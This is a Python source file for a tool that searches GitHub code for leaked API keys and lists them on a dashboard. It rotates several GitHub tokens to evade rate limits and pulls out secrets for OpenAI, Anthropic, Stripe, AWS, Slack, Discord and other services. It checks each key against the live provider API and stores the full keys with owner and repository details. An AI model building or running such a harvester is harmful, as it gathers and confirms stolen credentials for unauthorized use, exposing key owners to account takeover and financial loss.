import requests
import re
import json
import time
import os
import sys
from typing import List, Dict, Optional, Set
from pathlib import Path
from dataclasses import dataclass

@dataclass
class TokenConfig:
    tokens: List[str]
    current_idx: int = 0
    
    @property
    def current_token(self) -> str:
        return self.tokens[self.current_idx % len(self.tokens)]

class Scanner:
    def __init__(self, config: TokenConfig, result_file: str = "found_keys.json", db=None, stop_event=None):
        self.config = config
        self.result_file = Path(result_file)
        self.db = db
        self.stop_event = stop_event
        self._rate_limit_remaining = None
        self.patterns = {
            "OpenAI": re.compile(r"sk-(?:proj-[A-Za-z0-9]{20,}|[A-Za-z0-9]{20,})"),
            "HuggingFace": re.compile(r"hf_[A-Za-z0-9]{36,64}"),
            "Anthropic": re.compile(r"sk-ant-[A-Za-z0-9]{32,96}"),
            "Stripe": re.compile(r"(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{24,}"),
            "GitHub": re.compile(r"(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}"),
            "GoogleGemini": re.compile(r"AIza[0-9A-Za-z_-]{35}"),
            "TelegramBot": re.compile(r"\d{8,10}:[A-Za-z0-9_-]{35,45}"),
            "DiscordBot": re.compile(r"[MN][A-Za-z0-9_-]{23,25}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,}"),
            "SendGrid": re.compile(r"SG\.[A-Za-z0-9_-]{22,}\.[A-Za-z0-9_-]{43,}"),
            "GitLab": re.compile(r"glpat-[A-Za-z0-9_-]{20,}"),
            "Notion": re.compile(r"secret_[A-Za-z0-9]{43,48}"),
            "Linear": re.compile(r"lin_api_[A-Za-z0-9]{40,}"),
            "Mailgun": re.compile(r"key-[A-Za-z0-9]{32,}"),
            "Mapbox": re.compile(r"(?:pk|sk)\.[A-Za-z0-9]{60,}\.[A-Za-z0-9]{1,}"),
            "SlackBot": re.compile(r"xox[baprs]-[A-Za-z0-9]{10,}-[A-Za-z0-9]{10,}-[A-Za-z0-9]{24,}"),
            "AWSKey": re.compile(r"AKIA[0-9A-Z]{16}"),
        }
        self.queries = [
            "sk- AND \"sk-\" extension:env",
            "sk- AND \"sk-\" extension:json",
            "sk- AND \"sk-\" extension:yaml",
            "sk- AND \"sk-\" extension:py",
            "sk- AND \"sk-\" extension:js",
            "hf_ AND \"hf_\" extension:env",
            "hf_ AND \"hf_\" extension:json",
            "hf_ AND \"hf_\" extension:yaml",
            "sk-ant- AND \"sk-ant-\" extension:env",
            "sk-ant- AND \"sk-ant-\" extension:json",
            "sk-ant- AND \"sk-ant-\" extension:yaml",
            "sk_live_ extension:env",
            "sk_live_ extension:json",
            "sk_live_ extension:yaml",
            "rk_live_ extension:env",
            "\"ghp_\" AND ghp_ extension:env",
            "\"ghp_\" AND ghp_ extension:json",
            "ghp_ extension:txt",
            "gho_ extension:env",
            "ghs_ extension:env",
            "AIza extension:env",
            "AIza extension:json",
            "AIza extension:js",
            "\"SG.\" AND SG. extension:env",
            "\"SG.\" AND SG. extension:json",
            "\"key-\" AND api_key extension:env",
            "\"key-\" AND api_key extension:json",
            "glpat- extension:env",
            "glpat- extension:json",
            "secret_ AND notion extension:env",
            "secret_ AND notion extension:json",
            "lin_api_ extension:env",
            "lin_api_ extension:json",
            "xoxb- AND \"xoxb-\" extension:env",
            "xoxb- AND \"xoxb-\" extension:json",
            "\"AKIA\" AND secret extension:env",
            "\"AKIA\" AND secret extension:json",
            "sk- in:filename .env",
            "sk- in:filename .env.local",
            "sk- in:filename .env.production",
            "sk- in:filename .env.development",
            "sk- in:filename .env.staging",
            "hf_ in:filename .env",
            "hf_ in:filename .env.local",
            "ghp_ in:filename .env",
            "ghp_ in:filename .txt",
            "AIza in:filename .env",
            "api_key in:filename .env",
            "api_key in:filename .env.local",
            "secret in:filename .env",
            "secret in:filename .env.local",
            "token in:filename .env",
            "token in:filename .env.local",
        ]
        self.per_page = 50
        self.existing_keys: Set[str] = set()

    def load_existing_keys(self) -> Set[str]:
        """Load previously found keys from result file"""
        if not self.result_file.exists():
            return set()
            
        try:
            with open(self.result_file, "r", encoding="utf-8") as f:
                results = json.load(f)
                return {entry["key"] for entry in results}
        except Exception as e:
            print(f"Could not load {self.result_file}: {e}")
            return set()

    def get_headers(self) -> Dict[str, str]:
        """Generate request headers with current token"""
        return {"Authorization": f"token {self.config.current_token}"}

    def check_openai_key(self, api_key: str) -> bool:
        try:
            response = requests.get(
                "https://api.openai.com/v1/models",
                headers={"Authorization": f"Bearer {api_key}"},
                timeout=10
            )

            if response.status_code == 200:
                print(f" Valid OpenAI key: {api_key[:10]}...{api_key[-6:]}")
                return True

            print(f" Invalid OpenAI key: {api_key[:10]}...{api_key[-6:]}")
            return False

        except requests.exceptions.RequestException as e:
            print(f" Network error checking OpenAI key: {e}")
            return False

    def check_huggingface_key(self, api_key: str) -> bool:
        if not api_key or not api_key.startswith("hf_"):
            return False

        try:
            response = requests.get(
                "https://huggingface.co/api/whoami-v2",
                headers={
                    "Authorization": f"Bearer {api_key}",
                    "User-Agent": "HF-Key-Checker/1.0"
                },
                timeout=10
            )

            masked_key = (
                f"{api_key[:10]}...{api_key[-6:]}"
                if len(api_key) > 16
                else api_key
            )

            if response.status_code == 200:
                print(f"Valid Hugging Face key: {masked_key}")
                return True

            elif response.status_code in (401, 403):
                print(f"Invalid or unauthorized Hugging Face key: {masked_key}")
                return False

            else:
                print(
                    f"❓ Unexpected response ({response.status_code}): "
                    f"{response.text[:200]}"
                )
                return False

        except requests.exceptions.Timeout:
            print("Request timed out")
            return False

        except requests.exceptions.RequestException as e:
            print(f"Network error: {e}")
            return False

        except Exception as e:
            print(f"Unexpected error: {e}")
            return False

    def check_anthropic_key(self, api_key: str) -> bool:
        try:
            response = requests.get(
                "https://api.anthropic.com/v1/users/me",
                headers={"x-api-key": api_key, "anthropic-version": "2023-06-01"},
                timeout=10
            )
            if response.status_code == 200:
                print(f" Valid Anthropic key: {api_key[:12]}...{api_key[-6:]}")
                return True
            elif response.status_code == 401:
                print(f" Invalid Anthropic key: {api_key[:12]}...{api_key[-6:]}")
                return False
            else:
                print(f" Anthropic returned {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f" Network error checking Anthropic key: {e}")
            return False

    def check_stripe_key(self, api_key: str) -> bool:
        try:
            response = requests.get(
                "https://api.stripe.com/v1/charges?limit=1",
                auth=(api_key, ""),
                timeout=10
            )
            if response.status_code == 200:
                print(f" Valid Stripe key: {api_key[:12]}...{api_key[-6:]}")
                return True
            print(f" Invalid Stripe key: {api_key[:12]}...{api_key[-6:]}")
            return False
        except requests.exceptions.RequestException as e:
            print(f" Network error checking Stripe key: {e}")
            return False

    def check_github_key(self, api_key: str) -> bool:
        try:
            response = requests.get(
                "https://api.github.com/user",
                headers={"Authorization": f"Bearer {api_key}"},
                timeout=10
            )
            if response.status_code == 200:
                print(f" Valid GitHub token: {api_key[:6]}...{api_key[-6:]}")
                return True
            print(f" Invalid GitHub token: {api_key[:6]}...{api_key[-6:]}")
            return False
        except requests.exceptions.RequestException as e:
            print(f" Network error checking GitHub token: {e}")
            return False

    def check_google_gemini_key(self, api_key: str) -> bool:
        try:
            response = requests.get(
                f"https://generativelanguage.googleapis.com/v1/models?key={api_key}",
                timeout=10
            )
            if response.status_code == 200:
                print(f" Valid Google AI key: {api_key[:8]}...{api_key[-6:]}")
                return True
            print(f" Invalid Google AI key: {api_key[:8]}...{api_key[-6:]}")
            return False
        except requests.exceptions.RequestException as e:
            print(f" Network error checking Google AI key: {e}")
            return False

    def check_telegram_bot_key(self, api_key: str) -> bool:
        try:
            response = requests.get(
                f"https://api.telegram.org/bot{api_key}/getMe",
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                if data.get("ok"):
                    username = data.get("result", {}).get("username", "?")
                    print(f" Valid Telegram bot: @{username}")
                    return True
            print(f" Invalid Telegram bot token")
            return False
        except requests.exceptions.RequestException as e:
            print(f" Network error checking Telegram bot: {e}")
            return False

    def check_discord_bot_key(self, api_key: str) -> bool:
        try:
            response = requests.get(
                "https://discord.com/api/v10/users/@me",
                headers={"Authorization": f"Bot {api_key}"},
                timeout=10
            )
            if response.status_code == 200:
                print(f" Valid Discord bot token")
                return True
            print(f" Invalid Discord bot token")
            return False
        except requests.exceptions.RequestException as e:
            print(f" Network error checking Discord bot: {e}")
            return False

    def check_sendgrid_key(self, api_key: str) -> bool:
        try:
            response = requests.get(
                "https://api.sendgrid.com/v3/scopes",
                headers={"Authorization": f"Bearer {api_key}"},
                timeout=10
            )
            if response.status_code == 200:
                print(f" Valid SendGrid key: {api_key[:10]}...{api_key[-6:]}")
                return True
            print(f" Invalid SendGrid key: {api_key[:10]}...{api_key[-6:]}")
            return False
        except requests.exceptions.RequestException as e:
            print(f" Network error checking SendGrid key: {e}")
            return False

    def check_api_key(self, api_key: str, service: str) -> bool:
        checkers = {
            "OpenAI": self.check_openai_key,
            "HuggingFace": self.check_huggingface_key,
            "Anthropic": self.check_anthropic_key,
            "Stripe": self.check_stripe_key,
            "GitHub": self.check_github_key,
            "GoogleGemini": self.check_google_gemini_key,
            "TelegramBot": self.check_telegram_bot_key,
            "DiscordBot": self.check_discord_bot_key,
            "SendGrid": self.check_sendgrid_key,
        }
        checker = checkers.get(service)
        if checker:
            return checker(api_key)
        return True

    def search_github(self, query: str, page: int = 1) -> Optional[Dict]:
        """Search GitHub API for keys"""
        while True:
            if self.stop_event and self.stop_event.is_set():
                return None

            url = "https://api.github.com/search/code"
            params = {"q": query, "page": page, "per_page": self.per_page}
            print(f"[Token {self.config.current_idx+1}/{len(self.config.tokens)}] "
                  f"Searching GitHub for: {query}")
                   
            try:
                response = requests.get(
                    url, 
                    headers=self.get_headers(),
                    params=params
                )
                
                if response.status_code == 200:
                    self._rate_limit_remaining = response.headers.get('X-RateLimit-Remaining', '?')
                    return response.json()
                elif response.status_code == 403:
                    print("Rate limit hit! Switching GitHub token...")
                    self.config.current_idx += 1
                    if self.config.current_idx >= len(self.config.tokens):
                        print("All tokens exhausted. Sleeping for 5 minutes...")
                        self.config.current_idx = 0
                        for _ in range(300):
                            if self.stop_event and self.stop_event.is_set():
                                return None
                            time.sleep(1)
                    continue
                else:
                    print(f"GitHub API error: {response.status_code}")
                    return None
            except Exception as e:
                print(f"Network error: {e}")
                return None

    def is_placeholder(self, key: str) -> bool:
        placeholders = [
            "1234567", "xxxxx", "changeme", "placeholder",
            "your-api", "your_key", "YOUR_", "your-",
            "example", "test_key", "dummy", "sample",
        ]
        lower = key.lower()
        for p in placeholders:
            if p in lower:
                return True
        if len(set(key[-12:])) <= 3:
            return True
        if key.count("x") + key.count("X") > len(key) * 0.25:
            return True
        return False

    def get_file_content(self, item: Dict) -> str:
        repo = item['repository']['full_name']
        html_url = item.get('html_url', '')
        sha = ""
        if '/blob/' in html_url:
            sha = html_url.split('/blob/', 1)[1].split('/', 1)[0]
        path = item['path']

        urls = []
        if sha:
            urls.append(f"https://raw.githubusercontent.com/{repo}/{sha}/{path}")
        branch = item['repository'].get('default_branch', 'main')
        urls.append(f"https://raw.githubusercontent.com/{repo}/{branch}/{path}")

        for url in urls:
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    return response.text
            except Exception:
                continue
        return ''

    def scan_results(self, results: Dict) -> List[Dict]:
        """Scan GitHub search results for API keys"""
        found = []
        for item in results.get("items", []):
            file_url = item.get("html_url")
            repo = item.get("repository", {}).get("full_name")
            owner = item.get("repository", {}).get("owner", {}).get("login")
            repo_url = item.get("repository", {}).get("html_url")
            default_branch = item.get("repository", {}).get("default_branch")
            path = item.get("path")
            
            content = self.get_file_content(item)
            for name, pattern in self.patterns.items():
                keys = pattern.findall(content)
                for key in keys:
                    if key in self.existing_keys:
                        print(f"Skipped duplicate {name} key: {key[:10]}...{key[-6:]}")
                        continue
                        
                    if self.is_placeholder(key):
                        print(f" Skipped placeholder {name} key in {file_url}")
                        continue

                    try:
                        print(f"\nFound {name} key ({key[:12]}...{key[-6:]}) in {repo}")
                    except UnicodeEncodeError:
                        print(f"\nFound {name} key in {repo}")
                    valid = self.check_api_key(key, name)
                    status = "Valid" if valid else "Not Valid"
                    try:
                        print(f"  -> {name}: {status}")
                    except UnicodeEncodeError:
                        pass
                    if self.db:
                        self.db.add_activity(f"{name}: {status}", "info")
                    entry = {
                        "file_url": file_url,
                        "repo": repo,
                        "owner": owner,
                        "repo_url": repo_url,
                        "default_branch": default_branch,
                        "path": path,
                        "type": name,
                        "key": key,
                        "valid": valid
                    }
                    found.append(entry)
                    self.existing_keys.add(key)
                    if self.db:
                        self.db.add_key(
                            key=key, service=name, valid=valid,
                            file_url=file_url, repo=repo,
                            owner=owner, repo_url=repo_url, path=path,
                        )
                        
        return found

    def save_results(self, results: List[Dict]) -> None:
        try:
            with open(self.result_file, "w", encoding="utf-8") as f:
                json.dump(results, f, indent=2)
            print(f"\nResults saved to {self.result_file}")
        except Exception as e:
            print(f"Error saving JSON: {e}")
        if self.db:
            for r in results:
                self.db.add_key(
                    key=r["key"], service=r["type"], valid=r["valid"],
                    file_url=r.get("file_url", ""), repo=r.get("repo", ""),
                    owner=r.get("owner", ""), repo_url=r.get("repo_url", ""),
                    path=r.get("path", ""),
                )

    def run(self) -> None:
        """Main scanning loop"""
        self.existing_keys = self.load_existing_keys()
        all_found = []
        
        try:
            if self.result_file.exists():
                with open(self.result_file, "r", encoding="utf-8") as f:
                    all_found = json.load(f)
        except Exception as e:
            print(f"Warning: could not load previous results: {e}")

        for query in self.queries:
            if self.stop_event and self.stop_event.is_set():
                print("Scan stopped by user.")
                if self.db:
                    self.db.add_activity("Scan stopped by user", "warning")
                return
            page = 1
            while True:
                if self.stop_event and self.stop_event.is_set():
                    print("Scan stopped by user.")
                    if self.db:
                        self.db.add_activity("Scan stopped by user", "warning")
                    return
                results = self.search_github(query, page)
                if not results or 'items' not in results or len(results['items']) == 0:
                    print(f"No more results for query: {query}")
                    break
                    
                found = self.scan_results(results)
                all_found.extend(found)
                self.save_results(all_found)
                page += 1
                time.sleep(3)

        print("All queries complete. Exiting.")


def start_dashboard(host="127.0.0.1", port=5000, db_path="found_keys.db", tokens=None):
    from api.db import Database
    from dashboard.app import app, start_dashboard as _run_dash
    db = Database(db_path)
    db.initialize()

    if tokens:
        import threading
        token_list = [t.strip() for t in tokens.split(",") if t.strip()]
        def bg_scan():
            config = TokenConfig(tokens=token_list)
            scanner = Scanner(config, result_file="found_keys.json", db=db)
            scanner.run()
        t = threading.Thread(target=bg_scan, daemon=True)
        t.start()

    _run_dash(db, host=host, port=port)


if __name__ == "__main__":
    # Auto-clean: kill previous server on port 5000, clear caches
    import subprocess, shutil
    try:
        r = subprocess.run(
            ["powershell", "-Command",
             "Get-NetTCPConnection -LocalPort 5000 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty OwningProcess"],
            capture_output=True, text=True, timeout=5
        )
        pid = r.stdout.strip()
        if pid:
            subprocess.run(["taskkill", "/F", "/PID", pid], capture_output=True)
            print(f"Killed previous process (PID {pid})")
    except Exception:
        pass
    for d in [Path("__pycache__"), Path("api/__pycache__"), Path("dashboard/__pycache__")]:
        shutil.rmtree(d, ignore_errors=True)
    print("Cache cleared")

    import argparse
    parser = argparse.ArgumentParser(description="API Instructor - scan GitHub for exposed API keys")
    parser.add_argument("--scan", action="store_true", help="Run scan in CLI mode (default: start dashboard)")
    parser.add_argument("-t", "--tokens", help="GitHub token(s), comma-separated")
    parser.add_argument("--port", type=int, default=5000, help="Dashboard port (default: 5000)")
    parser.add_argument("--host", default="127.0.0.1", help="Dashboard host (default: 127.0.0.1)")
    parser.add_argument("--max-pages", type=int, default=50, help="Max pages per query")
    parser.add_argument("--delay", type=float, default=3.0, help="Delay between requests")
    parser.add_argument("-o", "--output", default="found_keys.db", help="Database path")
    args = parser.parse_args()

    if args.scan:
        if not args.tokens:
            print("Error: --tokens required for scan mode")
            sys.exit(1)
        from api.db import Database
        db = Database(args.output)
        db.initialize()
        config = TokenConfig(tokens=[t.strip() for t in args.tokens.split(",") if t.strip()])
        scanner = Scanner(config, result_file="found_keys.json", db=db)
        try:
            scanner.run()
        except KeyboardInterrupt:
            print("\nStopped by user.")
    else:
        start_dashboard(host=args.host, port=args.port, db_path=args.output, tokens=args.tokens)